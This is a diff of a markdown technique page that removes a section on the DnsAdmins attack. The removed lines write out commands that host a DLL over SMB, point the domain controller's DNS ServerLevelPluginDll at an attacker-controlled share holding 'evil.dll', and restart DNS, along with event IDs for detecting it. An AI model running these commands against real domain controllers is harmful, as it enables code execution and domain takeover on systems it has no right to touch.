@@ -30,18 +30,3 @@ flowchart TD
 
 ### Commands
 ```bash
-# ── Host the DLL ─────────────────────────────────────────────────────
-impacket-smbserver share ./dll -smb2support
-
-# ── Point DNS at the DLL ─────────────────────────────────────────────
-dnscmd DC01 /config /serverlevelplugindll \\10.10.10.99\share\evil.dll
-
-# ── Restart DNS ──────────────────────────────────────────────────────
-sc \\DC01 stop dns
-sc \\DC01 start dns
-```
-
-### Detection
-DNS registry **`ServerLevelPluginDll`** (**4657**); DNS service restart (**7036**); `dns.exe` loading a non-Microsoft DLL (**Sysmon 7**).
-
----
